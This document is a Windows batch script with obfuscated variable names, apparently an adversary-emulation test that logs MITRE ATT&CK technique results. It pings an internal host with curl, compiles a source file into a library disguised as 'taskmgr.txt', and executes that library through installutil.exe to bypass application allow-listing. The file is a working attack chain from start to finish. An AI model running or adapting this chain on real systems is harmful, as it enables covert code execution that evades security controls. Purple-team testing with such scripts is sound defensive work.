@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET recnn=%APPDATA%\8536\9a6a09f4
SET detcfkn=https://10.0.0.49
SET uouoq=https://10.0.0.49/stage/2/icon.png?8536-7
SET lqyereup=ITZEL-S2BS
SET ufeybybm=7
SET hpnjatpj=taskmgr.txt
SET njozco=file.txt
SET kkjwr=8536
SET oitmn=%APPDATA%\!ufeybybm!\macula-simulations.log

echo [%DATE% %TIME%][DEBUG][!lqyereup!]: start>> "!oitmn!" 2>nul
echo [%DATE% %TIME%][DEBUG][!lqyereup!]: hb_start>> "!oitmn!" 2>nul
curl -k -s -o nul "!uouoq!"
IF !errorlevel! EQU 0 (SET zvpx=1&SET ecqi=) ELSE (SET zvpx=0&SET ecqi=curl_failed)
echo [%DATE% %TIME%][!lqyereup!]: !ufeybybm!-!kkjwr!-T1105|Ingress Tool Transfer=!zvpx!:!ecqi!>> "!oitmn!" 2>nul
echo [%DATE% %TIME%][DEBUG][!lqyereup!]: hb_end>> "!oitmn!" 2>nul

echo [%DATE% %TIME%][DEBUG][!lqyereup!]: chdir_start>> "!oitmn!" 2>nul
cd /d "!recnn!" 2>nul
echo [%DATE% %TIME%][DEBUG][!lqyereup!]: chdir_end>> "!oitmn!" 2>nul

echo [%DATE% %TIME%][DEBUG][!lqyereup!]: compile_start>> "!oitmn!" 2>nul
vbc.exe /target:library /reference:System.Configuration.Install.dll "!njozco!" /out:"!hpnjatpj!" 2>nul
IF EXIST "!hpnjatpj!" (SET zvpx=1&SET ecqi=) ELSE (SET zvpx=0&SET ecqi=compile_failed)
echo [%DATE% %TIME%][!lqyereup!]: !ufeybybm!-!kkjwr!-T1500|Compile After Delivery=!zvpx!:!ecqi!>> "!oitmn!" 2>nul
echo [%DATE% %TIME%][DEBUG][!lqyereup!]: compile_end>> "!oitmn!" 2>nul

echo [%DATE% %TIME%][DEBUG][!lqyereup!]: exec_start>> "!oitmn!" 2>nul
installutil.exe /logfile= /LogToConsole=false /U "!hpnjatpj!" 2>nul
IF !errorlevel! EQU 0 (SET zvpx=1&SET ecqi=) ELSE (SET zvpx=0&SET ecqi=exec_failed)
echo [%DATE% %TIME%][!lqyereup!]: !ufeybybm!-!kkjwr!-T1218|Signed Binary Proxy Execution=!zvpx!:!ecqi!>> "!oitmn!" 2>nul
echo [%DATE% %TIME%][DEBUG][!lqyereup!]: exec_end>> "!oitmn!" 2>nul
ENDLOCAL